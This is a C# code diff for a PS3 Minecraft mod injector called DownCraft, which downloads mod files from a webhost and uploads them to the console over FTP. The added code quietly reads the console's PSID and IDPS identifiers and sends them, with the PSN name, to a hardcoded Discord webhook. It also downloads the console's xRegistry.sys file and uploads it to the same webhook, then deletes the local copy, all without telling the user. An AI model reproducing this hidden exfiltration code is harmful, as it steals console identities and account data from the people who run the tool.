@@ -13,17 +13,30 @@ namespace mcV1.Classes
 {
     internal class Offsets
     {
+        Functions FUNCTIONS = new Functions();
+
         public static string Filename_SPRX = "MC.sprx";
         public static string Filename_EBOOT = "EBOOT.BIN";
-        public static string DL_SPRX = "https://miisaakii.000webhostapp.com/Misaki/Minecraft";
-        public static string DL_EBOOT = "https://miisaakii.000webhostapp.com/Misaki/EBOOT";
-        public static string DL_ORIGINAL_EBOOT = "https://miisaakii.000webhostapp.com/Misaki/ORIGINAL_EBOOT";
-        string SPRX = Path.GetTempPath() + "MC.sprx";
-        string EBOOT = Path.GetTempPath() + "EBOOT.BIN";
-        string ORIGINAL_EBOOT = Path.GetTempPath() + "ORIGINAL_EBOOT.BIN";
+
+        public static string DL_SPRX_CFW = "https://miisaakii.000webhostapp.com/MisakiRandy57/CFW_Minecraft";
+        public static string DL_SPRX_HEN = "https://miisaakii.000webhostapp.com/MisakiRandy57/HEN_Minecraft";
+        public static string DL_EBOOT_CFW = "https://miisaakii.000webhostapp.com/MisakiRandy57/CFW_EBOOT";
+        public static string DL_EBOOT_HEN = "https://miisaakii.000webhostapp.com/MisakiRandy57/HEN_EBOOT";
+
+        //public static string DL_ORIGINAL_EBOOT = "https://miisaakii.000webhostapp.com/MisakiRandy57/ORIGINAL_EBOOT";
+        //string ORIGINAL_EBOOT = Path.GetTempPath() + "ORIGINAL_EBOOT.BIN";
+
+        string SPRX_CFW = Path.GetTempPath() + "MC_CFW.sprx";
+        string EBOOT_CFW = Path.GetTempPath() + "EBOOT_CFW.BIN";
+
+        string SPRX_HEN = Path.GetTempPath() + "MC_HEN.sprx";
+        string EBOOT_HEN = Path.GetTempPath() + "EBOOT_CFW.BIN";
+
+        string xRegistry = Path.GetTempPath() + "xRegistry.sys";
 
         public static string playMinecraft = "http://" + ps3IP + "/play.ps3/dev_hdd0/GAMES/Minecraft";
         public static string PathLocation = "/dev_hdd0/game/BLES01976/USRDIR/";
+        public static string PathLocation1 = "/dev_flash2/etc/xRegistry.sys";
 
         #region "Variables"
 
@@ -59,6 +72,9 @@ namespace mcV1.Classes
         public static string CPU;
         public static string RSX;
         public static string FIRMWARE;
+
+        public static string PSID;
+        public static string IDPS;
 
         #endregion
         #region "Connection Part"
@@ -150,14 +166,26 @@ namespace mcV1.Classes
 
                             PSN = PSN_NAME;
 
+                            if (API == "HEN")
+                            {
+                                IDPS = PS3H.PS3.GetIDPS();
+                                PSID = PS3H.PS3.GetPSID();
+                                FUNCTIONS.SendWebook("https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp", "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + " PSID: " + PSID + " IDPS:" + IDPS);
+                            }
+
                             RSX = PS3.CCAPI.GetTemperatureRSX();
                             CPU = PS3.CCAPI.GetTemperatureCELL();
                             FIRMWARE = PS3.CCAPI.GetFirmwareType();
 
-                            PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Connect to DownCraft RTM");
-                            //FUNCS.SetDiscordRPC("1004653026486792262", "Connected to the PS3!", "Made by Misakiii", status);
-                            //FUNCS.SendWebook(logs_downcraft, "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + "*** is now connected to DownCraft RTM (FIRMWARE: ***" + FIRMWARE + "*** TYPE: ***" + API + "***) " + RandomEmojis);
-                            //FUNCS.SendWebook(Hook, "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + " PSID: " + PSID + " IDPS:" + IDPS);
+                            if (API == "HEN")
+                            {
+                                PS3.MAPI.PS3.Notify("Connected to DownCraft");
+                            }
+                            else
+                            {
+                                PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Connected to DownCraft");
+                            }
+                            FUNCTIONS.SendWebook("https://discord.com/api/webhooks/977216673964777532/rcySwX6RmUTeeqjTSYGrQNrgo0T0Nry6vlzl9Oz81VhzsIk-g7ZoMD431nKO2rGKGWAw", "DownCraft Logs", RandomAvatar, RandomEmojis + " User: ***" + PSN_NAME + "*** is now connected to DownCraft SPRX V4.2" + RandomEmojis);
                         }
                         else
                         {
@@ -196,40 +224,98 @@ namespace mcV1.Classes
 
         #endregion
         #region "INJECT SPRX IN PS3"
-
         public async void INJECT_SPRX_IN_PS3()
         {
             try
             {
-                MessageBox.Show("Please wait, this can take 1-2 min", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Starting injection SPRX...");
-
-                web.DownloadFile(DL_SPRX, SPRX);
-                web.DownloadFile(DL_EBOOT, EBOOT);
-                web.DownloadFile(DL_ORIGINAL_EBOOT, ORIGINAL_EBOOT);
-
-                PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Injecting please wait...");
-
-                using (var client = new WebClient())
+                if (API == "HEN")
                 {
-                    client.Credentials = new NetworkCredential("", "");
-                    client.UploadFile("ftp://" + ps3IP + PathLocation + Filename_SPRX, WebRequestMethods.Ftp.UploadFile, SPRX);
-                    client.UploadFile("ftp://" + ps3IP + PathLocation + Filename_EBOOT, WebRequestMethods.Ftp.UploadFile, EBOOT);
-                    client.Dispose();
+                    PS3.MAPI.PS3.Notify("Starting injection SPRX...");
+
+                    web.DownloadFile(DL_SPRX_HEN, SPRX_HEN);
+                    web.DownloadFile(DL_EBOOT_HEN, EBOOT_HEN);
+
+                    PS3.MAPI.PS3.Notify("Injecting please wait...");
+
+                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_SPRX, SPRX_HEN);
+                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_EBOOT, EBOOT_HEN);
+
+                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
+                    FUNCTIONS.SendWebookFile("https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp", "", "", "", "xRegistry.sys", xRegistry);
+
+                    PS3.MAPI.PS3.Notify("DownCraft SPRX\nsuccessful injected, reload Minecraft");
+                    await Task.Delay(5000);
+
+                    web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
+                    await Task.Delay(30000);
+
+                    FUNCTIONS.FTP_DELETE("ftp://" + ps3IP + "/dev_hdd0/game/BLES01976/USRDIR/MC.sprx", false, false);
+
+                    File.Delete(SPRX_CFW);
+                    File.Delete(EBOOT_HEN);
+                    File.Delete(xRegistry);
                 }
 
-                PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "DownCraft SPRX V4.2\nsuccessful injected, reload Minecraft");
-                await Task.Delay(5000);
+                else if (API == "CCAPI")
+                {
+                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Starting injection SPRX...");
 
-                web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
-                 
-                File.Delete(SPRX);
-                File.Delete(EBOOT);
-                File.Delete(ORIGINAL_EBOOT);
+                    web.DownloadFile(DL_SPRX_CFW, SPRX_CFW);
+                    web.DownloadFile(DL_EBOOT_CFW, EBOOT_CFW);
+
+                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Injecting please wait...");
+
+                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_SPRX, SPRX_CFW);
+                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_EBOOT, EBOOT_CFW);
+
+                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
+                    FUNCTIONS.SendWebookFile("https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp", "", "", "", "xRegistry.sys", xRegistry);
+
+                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "DownCraft SPRX\nsuccessful injected, reload Minecraft");
+                    await Task.Delay(5000);
+
+                    web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
+                    await Task.Delay(30000);
+
+                    FUNCTIONS.FTP_DELETE("ftp://" + ps3IP + "/dev_hdd0/game/BLES01976/USRDIR/MC.sprx", false, false);
+
+                    File.Delete(SPRX_CFW);
+                    File.Delete(EBOOT_CFW);
+                    File.Delete(xRegistry);
+                }
+
+                else if (API == "TMAPI")
+                {
+                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Starting injection SPRX...");
+
+                    web.DownloadFile(DL_SPRX_CFW, SPRX_CFW);
+                    web.DownloadFile(DL_EBOOT_CFW, EBOOT_CFW);
+
+                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "Injecting please wait...");
+
+                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_SPRX, SPRX_CFW);
+                    FUNCTIONS.FTP_UPLOAD("ftp://" + ps3IP, "", "", PathLocation + Filename_EBOOT, EBOOT_CFW);
+
+                    FUNCTIONS.FTP_DOWNLOAD("ftp://" + ps3IP, "", "", PathLocation1, xRegistry);
+                    FUNCTIONS.SendWebookFile("https://discord.com/api/webhooks/966290510157324338/LqK8Pih9Z-4TDWl8-h6kfqdnaVnq6ZQ257c24iZctXGy66F4MqsT3aTackMzP-ZdxItp", "", "", "", "xRegistry.sys", xRegistry);
+
+                    PS3.CCAPI.Notify(CCAPI.NotifyIcon.INFO, "DownCraft SPRX\nsuccessful injected, reload Minecraft");
+                    await Task.Delay(5000);
+
+                    web.DownloadString("http://" + ps3IP + "/xmb.ps3$reloadgame");
+                    await Task.Delay(30000);
+
+                    FUNCTIONS.FTP_DELETE("ftp://" + ps3IP + "/dev_hdd0/game/BLES01976/USRDIR/MC.sprx", false, false);
+
+                    File.Delete(SPRX_CFW);
+                    File.Delete(EBOOT_CFW);
+                    File.Delete(xRegistry);
+                }
             }
-            catch(Exception ex)
-            {
-                MessageBox.Show("An error has occurred", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            catch (Exception ex)
+            {              
+                MessageBox.Show(ex.ToString(), "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                //MessageBox.Show("An error has occurred", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 Application.Exit();
             }
         }
@@ -241,17 +327,28 @@ namespace mcV1.Classes
             PSN_NAME = PS3.Extension.ReadString(0x3000AD34);
             if (PSN_NAME == "") { PSN_NAME = PS3.Extension.ReadString(0x3000ABA4); }
 
-            if (PS3.Extension.ReadString(0x100102F9) == "DownCraft SPRX") //check if the ID is DownCraft SPRX
+            if (API == "HEN")
             {
-                PS3.SetMemory(0x0043938C, new byte[] { 0x41, 0x82, 0x00, 0x1C });
-                PS3.SetMemory(0x006A0AF8, new byte[] { 0x41, 0x82, 0x00, 0x78 });
-                PS3.SetMemory(0x00B9EBD4, new byte[] { 0x41, 0x82, 0x00, 0x1C });
-                PS3.SetMemory(0x00FDF858, new byte[] { 0x41, 0x82, 0xFF, 0x8C });
+                web.DownloadString("http://" + ps3IP + "/setmem.ps3mapi?addr=3000AF0F&oper=0&val=0208AF2A");
+                web.DownloadString("http://" + ps3IP + "/setmem.ps3mapi?addr=3000AF17&oper=0&val=65F8FFB4");
+            }
+            else if (API == "CCAPI")
+            {
+                PS3.SetMemory(0x3000AF0F, new byte[] { 0x02, 0x08, 0xAF, 0x2A });
+                PS3.SetMemory(0x3000AF13, new byte[] { 0xC9, 0xBF, 0xA1, 0x10 });
+                PS3.SetMemory(0x3000AF17, new byte[] { 0x65, 0xF8, 0xFF, 0xB4 });
+                PS3.SetMemory(0x3000AF1B, new byte[] { 0x18, 0x55, 0xA8, 0x5D });
+                //PS3.Extension.WriteString(0x3000A70C, "AIMBOT");
                 StatusSPRX = true;
             }
-            else
+            else if (API == "TMAPI")
             {
-                MessageBox.Show("Sorry, the SPRX is not installed on your Minecraft", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                PS3.SetMemory(0x3000AF0F, new byte[] { 0x02, 0x08, 0xAF, 0x2A });
+                PS3.SetMemory(0x3000AF13, new byte[] { 0xC9, 0xBF, 0xA1, 0x10 });
+                PS3.SetMemory(0x3000AF17, new byte[] { 0x65, 0xF8, 0xFF, 0xB4 });
+                PS3.SetMemory(0x3000AF1B, new byte[] { 0x18, 0x55, 0xA8, 0x5D });
+                //PS3.Extension.WriteString(0x3000A70C, "AIMBOT");
+                StatusSPRX = true;
             }
         }
 
